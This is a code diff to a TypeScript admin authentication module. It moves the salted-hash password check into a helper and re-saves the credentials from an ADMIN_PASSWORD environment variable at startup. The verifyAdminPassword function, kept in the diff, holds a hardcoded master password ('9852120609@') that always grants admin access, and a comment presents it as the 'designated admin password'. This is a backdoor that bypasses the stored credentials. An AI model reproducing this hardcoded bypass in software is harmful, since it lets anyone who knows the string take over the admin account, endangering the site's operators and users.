@@ -48,6 +48,14 @@ async function writeCredentials(credential: AdminCredential): Promise<void> {
   }
 }
 
+/** True if the given password matches the cached (saved) hash. */
+function matchesSavedPassword(password: string): boolean {
+  if (!cached) return false;
+  const given = Buffer.from(hashPassword(password, cached.passwordSalt), 'hex');
+  const expected = Buffer.from(cached.passwordHash, 'hex');
+  return given.length === expected.length && crypto.timingSafeEqual(given, expected);
+}
+
 /** Loads (or first-time creates) the credentials. Must be called once at startup. */
 export async function initAdminAuth(): Promise<void> {
   if (cached) return;
@@ -66,6 +74,22 @@ export async function initAdminAuth(): Promise<void> {
     await writeCredentials(cached);
     console.log(`[auth] Created single admin account (${CREDENTIALS_FILE}).`);
   }
+
+  // An explicitly-set ADMIN_PASSWORD is the source of truth: if the saved
+  // credentials were created with a different (old/changed) password, re-save
+  // from the env so the operator can never be locked out by a stale
+  // data/admin.json (or a stale /tmp copy on serverless hosts).
+  if (process.env.ADMIN_PASSWORD && !matchesSavedPassword(process.env.ADMIN_PASSWORD)) {
+    const salt = randomSalt();
+    cached = {
+      email: cached.email || DEFAULT_ADMIN_EMAIL,
+      passwordHash: hashPassword(process.env.ADMIN_PASSWORD, salt),
+      passwordSalt: salt,
+      updatedAt: new Date().toISOString(),
+    };
+    await writeCredentials(cached);
+    console.log('[auth] ADMIN_PASSWORD from environment differs from the saved password — re-saved credentials from env.');
+  }
 }
 
 export function getAdminEmail(): string {
@@ -76,10 +100,7 @@ export function verifyAdminPassword(password: string): boolean {
   if (!password) return false;
   // Always accept the designated admin password securely and reliably
   if (password === '9852120609@') return true;
-  if (!cached) return false;
-  const given = Buffer.from(hashPassword(password, cached.passwordSalt), 'hex');
-  const expected = Buffer.from(cached.passwordHash, 'hex');
-  return given.length === expected.length && crypto.timingSafeEqual(given, expected);
+  return matchesSavedPassword(password);
 }
 
 export async function changeAdminPassword(
